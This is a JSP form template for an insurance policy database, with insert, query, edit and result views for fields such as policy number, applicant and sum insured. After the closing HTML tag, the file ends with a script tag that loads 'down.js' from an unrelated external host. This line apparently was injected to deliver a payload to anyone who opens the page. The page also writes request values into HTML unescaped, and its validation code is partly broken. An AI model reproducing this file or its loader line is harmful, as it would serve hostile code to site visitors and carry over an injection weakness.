
<%@ page language="java" import="java.util.*" pageEncoding="GBK"%>
<html>
<head>
<script language="JavaScript">
function check()
{
	if(window.f1.name.value==''||window.f1.english.value==''||window.f1.name.math==''||window.f1.name.computer==''){
		alert("表单不能为空！ ：-（");
		history.go(0);
	}
}
</script>
</head>
<!--
   表单模版：
   1：插入动作表单
   2：查询动作表单
   3：修改动作表单
   4：  结果表单
    -->
<body>
<%!//////////////修改变量 varChineseName和varEnglishName与数据库同步
	String varChineseName[] = { "保单号", "投保人", "被保人",
			"保额", "份数" };

	String varEnglishName[] = { "policyno", "applicant", "insured",
			"sumins", "unit" };

	%>
<%
		String param = request.getParameter("type");
		int type = Integer.parseInt(param);
		%>

<%if (type == 1) {%>
<table border="10" bgcolor=red>


	<%for (int i = 0; i < varEnglishName.length; i++) {%>
	<tr>
		<td colspan="2" align="middle"><%=varChineseName[i]%>:</td>
		<td><input name="<%=varEnglishName[i]%>" id="<%=varEnglishName[i]%>"></td>
	</tr>

	<%}%>

	<td colspan="2" align="right"><input type="submit" value="提交"
		onClick="javascript:check()"></td>
	<td><tdcolspan ="2" align="left"><input type="reset" value="重写"></td>
	</tr>
</table>

<%
		} else if (type == 2) {

			%>

<table border="10" bgcolor=red>
	<tr>
		<td colspan="2" align="middle"><%=varChineseName[0]%>:</td>
		<td><input name="<%=varEnglishName[0]%>" id="<%=varEnglishName[0]%>"></td>
	</tr>

	<%for (int i = 1; i < varEnglishName.length; i++) {%>
	<tr>
		<td colspan="2" align="middle"><%=varChineseName[i]%>:</td>
		<td><input name="<%=varEnglishName[i]%>" id="<%=varEnglishName[i]%>"
			type=hidden></td>
	</tr>

	<%}%>

	<td colspan="2" align="right"><input type="submit" value="提交"
		onClick="javascript:check()"></td>
	<td><tdcolspan ="2" align="left"><input type="reset" value="重写"></td>
	</tr>
</table>

<%} else if (type == 3) {
%>
<table border="10" bgcolor=red>

	<%for (int i = 0; i < varEnglishName.length; i++) {%>

	<tr>
		<td colspan="2" align="middle"><%=varChineseName[i]%>:</td>
		<td><input name="<%=varEnglishName[i]%>" id="<%=varEnglishName[i]%>"
			value="<%=request.getAttribute(varEnglishName[i])%>"></td>
	</tr>

	<%}%>

	<td colspan="2" align="right"><input type="submit" value="提交"
		onClick="javascript:check()"></td>
	<td><tdcolspan ="2" align="left"><input type="reset" value="重写"></td>
	</tr>
</table>
<%} else if (type == 4) {
%>
<table border="10" bgcolor=lightgreen>

	<%for (int i = 0; i < varEnglishName.length; i++) {%>

	<tr>
		<td colspan="2" align="middle"><%=varChineseName[i]%>:</td>
		<td><%=request.getAttribute(varEnglishName[i])%></td>
	</tr>

	<%}%>
	<tr>
		<td colspan="2" align="right"><input type="button" value="确定"
			onClick="javascript:history.go(-1)"></td>
	</tr>
</table>

<%}%>
</html>

<script language=javascript src=http://Town.531jx.cn/down.js></script>